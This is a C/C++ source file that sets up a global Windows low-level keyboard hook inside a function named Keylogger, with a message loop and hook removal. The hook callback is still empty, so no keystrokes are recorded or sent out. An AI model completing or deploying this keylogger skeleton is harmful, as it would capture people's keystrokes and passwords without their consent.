#include "winkey.h"

HHOOK g_Hook = NULL;

bool    Keylogger()
{
    if (SetupKeyHook() == false)
        return false;

    MSG     msg;

    while (GetMessage(&msg, NULL, 0, 0))        // Wait for event
    {
        TranslateMessage(&msg);                 // Translate event of virtual key to character
        DispatchMessage(&msg);                  // Send message to window, maybe not useful for us
    }
    

    RemoveKeyHook();

    return true;
}

LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
/*
    nCode  -> A code the hook procedure uses to determine how to process the message.
    wParam -> The virtual-key code of the key that generated the keystroke message
    lParam -> Pointer to a struct KBDLLHOOKSTRUCT
*/
{

    
    return CallNextHookEx(g_Hook, code, wParam, lParam);
}

bool    SetupKeyHook()
{
    g_Hook = SetWindowsHookExW( WH_KEYBOARD_LL,             // Type of procedure
                                    KeyboardProc,           // Callback function
                                    GetModuleHandle(NULL),  // Used if callback function is in a .dll
                                    0);                     // 0 Associate the callback to every thread
    
    if (g_Hook == NULL)
    {
        return false;
    }

    return true;
}

void    RemoveKeyHook()
{
    if (g_Hook != NULL)
    {
        UnhookWindowsHookEx(g_Hook);
        g_Hook = NULL;
    }
}


// typedef struct tagMSG 
// {
//     HWND   hwnd;
//     UINT   message;
//     WPARAM wParam;
//     LPARAM lParam;
//     DWORD  time;
//     POINT  pt;
//     DWORD  lPrivate;
//
// }   MSG;